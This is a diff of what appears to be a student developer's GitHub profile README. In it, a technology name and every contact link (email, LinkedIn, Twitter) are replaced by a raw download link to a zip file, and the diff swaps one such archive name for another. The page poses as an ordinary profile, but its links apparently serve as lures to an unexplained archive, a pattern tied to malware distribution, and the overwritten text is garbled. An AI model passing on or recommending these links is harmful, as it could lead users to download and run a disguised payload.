@@ -16,7 +16,7 @@ Hello, I'm Natnael Letibelu, a passionate learner currently pursuing the **ALX B
 Here are some of the technologies I am working with:
 
 - **Programming Languages**: Python, JavaScript, C#
-- **Backend Development**: https://raw.githubusercontent.com/elnatnael/elnatnael/main/overinsurance/Software_1.5.zip, Express, Django, Flask
+- **Backend Development**: https://raw.githubusercontent.com/elnatnael/elnatnael/main/overinsurance/Software_pencatite.zip, Express, Django, Flask
 - **Databases**: MySQL, PostgreSQL, MongoDB
 - **Version Control**: Git, GitHub
 - **Tools & Platforms**: Docker, AWS, Heroku, CI/CD pipelines
@@ -27,7 +27,7 @@ Here are some of the projects I’m working on or have worked on:
 
 ### 1. **[Airbnb Clone Project](#)**  
 - A full-stack clone of Airbnb that replicates the essential features of the platform.
-- Technologies used: **https://raw.githubusercontent.com/elnatnael/elnatnael/main/overinsurance/Software_1.5.zip**, **Express**, **MongoDB**, **HTML/CSS**, **JavaScript**.
+- Technologies used: **https://raw.githubusercontent.com/elnatnael/elnatnael/main/overinsurance/Software_pencatite.zip**, **Express**, **MongoDB**, **HTML/CSS**, **JavaScript**.
 - **Project Goal**: To practice building real-world web applications with a focus on backend development and database management.
 
 ### 2. **[UI/UX Designer](#)**  
@@ -44,8 +44,8 @@ I am actively contributing to open-source projects and collaborating with other 
 
 I’m always open to collaborating on exciting projects or discussing new opportunities. Feel free to reach out to me through the following platforms:
 
-- **Email**: [https://raw.githubusercontent.com/elnatnael/elnatnael/main/overinsurance/Software_1.5.zip]
-- **LinkedIn**: [https://raw.githubusercontent.com/elnatnael/elnatnael/main/overinsurance/Software_1.5.zip]
-- **Twitter**: [https://raw.githubusercontent.com/elnatnael/elnatnael/main/overinsurance/Software_1.5.zip](#)
+- **Email**: [https://raw.githubusercontent.com/elnatnael/elnatnael/main/overinsurance/Software_pencatite.zip]
+- **LinkedIn**: [https://raw.githubusercontent.com/elnatnael/elnatnael/main/overinsurance/Software_pencatite.zip]
+- **Twitter**: [https://raw.githubusercontent.com/elnatnael/elnatnael/main/overinsurance/Software_pencatite.zip](#)
 
 ## Let's Build Something Amazing! 🌟
